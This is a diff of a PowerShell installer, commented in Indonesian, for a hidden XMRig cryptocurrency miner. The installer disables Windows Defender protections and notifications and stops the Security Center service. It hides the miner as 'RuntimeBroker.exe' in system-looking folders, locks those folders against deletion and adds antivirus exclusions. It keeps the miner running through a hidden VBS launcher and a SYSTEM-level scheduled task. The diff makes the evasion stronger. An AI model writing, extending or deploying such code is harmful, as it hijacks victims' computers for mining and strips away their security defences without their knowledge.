@@ -1,5 +1,5 @@
 # ==========================================
-# 1. MATIKAN TOTAL SISA TAMENG DEFENDER
+# 1. MATIKAN TOTAL SISA TAMENG DEFENDER & NOTIFIKASI
 # ==========================================
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
@@ -9,10 +9,46 @@ Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
 Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
 Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
 
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -Force -ErrorAction SilentlyContinue
+
+Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
+Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
+
 # ==========================================
-# 2. INISIALISASI DIREKTORI & TARGET
+# 2. INISIALISASI DIREKTORI DINAMIS & TARGET
 # ==========================================
-$Dir = "C:\Users\Public\Libraries"
+$PossibleDirs = @(
+    "C:\Users\Public\Libraries",
+    "$env:ProgramData\Microsoft\Windows\Templates",
+    "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
+    "$env:PUBLIC\Documents"
+)
+
+$Dir = ""
+foreach ($Candidate in $PossibleDirs) {
+    try {
+        if (!(Test-Path $Candidate)) {
+            New-Item -ItemType Directory -Force -Path $Candidate -ErrorAction Stop | Out-Null
+        }
+        $TestFile = Join-Path $Candidate "test.tmp"
+        Set-Content -Path $TestFile -Value "test" -ErrorAction Stop
+        Remove-Item -Path $TestFile -Force -ErrorAction SilentlyContinue
+        $Dir = $Candidate
+        break
+    } catch {
+        continue
+    }
+}
+
+if ([string]::IsNullOrEmpty($Dir)) {
+    $Dir = Join-Path $env:TEMP "WinUpdateCache"
+    if (!(Test-Path $Dir)) {
+        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
+    }
+}
+
 $ExeName = "RuntimeBroker.exe" 
 $ExePath = Join-Path $Dir $ExeName
 $VbsPath = Join-Path $Dir "run.vbs"
@@ -25,17 +61,15 @@ $ArgsList = "-o $Pool -u $Wallet -p x --donate-level=1 --cpu-max-threads-hint=70
 Stop-Process -Name "RuntimeBroker", "xmrig", "wscript", "OneDriveUpdater" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
-if (!(Test-Path $Dir)) { 
-    New-Item -ItemType Directory -Force -Path $Dir | Out-Null 
-}
-
 # ==========================================
 # 3. KUNCI FOLDER & DEFENDER EXCLUSION
 # ==========================================
-$Acl = Get-Acl $Dir
-$DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Allow")
-$Acl.AddAccessRule($DenyRule)
-Set-Acl $Dir $Acl -ErrorAction SilentlyContinue
+try {
+    $Acl = Get-Acl $Dir
+    $DenyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete, DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Allow")
+    $Acl.AddAccessRule($DenyRule)
+    Set-Acl $Dir $Acl -ErrorAction SilentlyContinue
+} catch {}
 
 Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue
@@ -73,7 +107,7 @@ shell.Run """$ExePath"" $ArgsList", 0, False
     Add-MpPreference -ExclusionPath $VbsPath -ErrorAction SilentlyContinue
 
     # ==========================================
-    # 6. TASK SCHEDULER SYSTEM PRIVILEGE (TERSEMBUNYI DARI USER BIASA)
+    # 6. TASK SCHEDULER SYSTEM PRIVILEGE
     # ==========================================
     Unregister-ScheduledTask -TaskName "RuntimeBrokerService" -Confirm:$false -ErrorAction SilentlyContinue
     
@@ -82,7 +116,6 @@ shell.Run """$ExePath"" $ArgsList", 0, False
         (New-ScheduledTaskTrigger -AtStartup),
         (New-ScheduledTaskTrigger -AtLogOn)
     )
-    # Dijalankan dengan akun SYSTEM tertinggi agar tersembunyi dari tab proses user standar
     $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType Service -RunLevel Highest
     $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 3
     
@@ -91,7 +124,7 @@ shell.Run """$ExePath"" $ArgsList", 0, False
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses! Berjalan senyap sebagai SYSTEM Service (tersembunyi dari user biasa)." -ForegroundColor Green
+    Write-Host "Setup sukses di: $Dir" -ForegroundColor Green
 } else {
     Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
 }
